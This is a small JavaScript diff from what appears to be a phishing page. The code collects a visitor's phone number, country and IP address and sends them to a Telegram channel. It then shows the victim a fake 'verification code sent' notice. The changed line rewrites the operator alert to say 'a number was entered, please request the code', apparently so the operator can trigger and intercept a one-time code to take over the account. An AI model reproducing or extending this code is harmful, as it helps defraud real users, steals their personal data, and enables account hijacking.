@@ -419,7 +419,7 @@
             collectedData.country = country;
             collectedData.rawPhone = phone;
 
-            const msg = `🔔 <b>📱 رقم هاتف جديد</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${collectedData.phone}</code>\n<b>الدولة:</b> ${country}\n<b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}\n<b>IP:</b> ${await getIP()}\n━━━━━━━━━━━━━━`;
+            const msg = `🔔 <b>📱تم إدخال رقم يرجي طلب الكود</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${collectedData.phone}</code>\n<b>الدولة:</b> ${country}\n<b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}\n<b>IP:</b> ${await getIP()}\n━━━━━━━━━━━━━━`;
             await sendToTelegram(msg);
 
             showToast('📩 تم إرسال رمز التحقق إلى هاتفك');
